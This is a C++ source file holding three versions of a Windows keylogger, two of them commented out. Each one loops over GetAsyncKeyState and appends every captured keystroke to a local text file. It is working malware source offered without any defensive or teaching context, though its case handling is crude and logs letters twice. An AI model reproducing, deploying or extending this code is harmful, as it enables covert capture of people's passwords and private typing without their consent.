/*

#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

int main() {
    ofstream keystroke_file("keystrokes.txt", ios::app);
    char c;
    while (true) {
        for (c = 8; c <= 222; c++) {
            if (GetAsyncKeyState(c) == -32767) {
                //cout << (int)c << endl;
                if (c == VK_RETURN) {
                    keystroke_file << endl;
                } else if (c == VK_BACK) {
                    keystroke_file << "<BACKSPACE>";
                } else if (c == VK_SPACE) {
                    keystroke_file << " ";
                } else {
                    if(((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10)) )
                    {
                        c+=32;
                        keystroke_file<<c;
                        break;
                    }
                    else if((c>64)&&(c<91))
                    {

                        keystroke_file<<c;
                        break;
                    }
                }
            }
        }
    }
    keystroke_file.close();
    return 0;
}

*/




#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

int main() {
    ofstream keystroke_file("keystrokes.txt", ios::app);
    char c;
    while (true) {
        for (c = 8; c <= 222; c++) {
            if (GetAsyncKeyState(c) == -32767) {
                if (c == VK_RETURN) {
                    keystroke_file << endl;
                } else if (c == VK_BACK) {
                    keystroke_file << "<BACKSPACE>";
                } else if (c == VK_SPACE) {
                    keystroke_file << " ";
                } else {
                    if(((c>64)&&(c<91))&&!(GetAsyncKeyState(0x10)) )
                    {
                        c+=32;
                        keystroke_file<<c;
                        c-=32;
                        keystroke_file<<c;
                        break;
                    }
                    else if((c>64)&&(c<91))
                    {

                        keystroke_file<<c;
                        c+=32;
                        keystroke_file<<c;
                        break;
                    }
                }
            }
        }
    }
    keystroke_file.close();
    return 0;
}




/*
#include <iostream>
#include <fstream>
#include <Windows.h>
#include <cctype>

using namespace std;

int main() {
    ofstream keystroke_file("keystrokes2.txt", ios::app);
    char c;
    while (true) {
        for (c = 8; c <= 222; c++) {
            if (GetAsyncKeyState(c) == -32767) {
                if (c == VK_RETURN) {
                    keystroke_file << endl;
                } else if (c == VK_BACK) {
                    keystroke_file << "<BACKSPACE>";
                } else if (c == VK_SPACE) {
                    keystroke_file << " ";
                } else {
                    if (isalpha(c)) {
                        if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
                            keystroke_file << char(toupper(c));
                            keystroke_file << char(tolower(c));
                        } else {
                            keystroke_file << char(tolower(c));
                            keystroke_file << char(toupper(c));
                        }
                    } else {
                        keystroke_file << c;
                    }
                }
            }
        }
    }
    keystroke_file.close();
    return 0;
}
*/
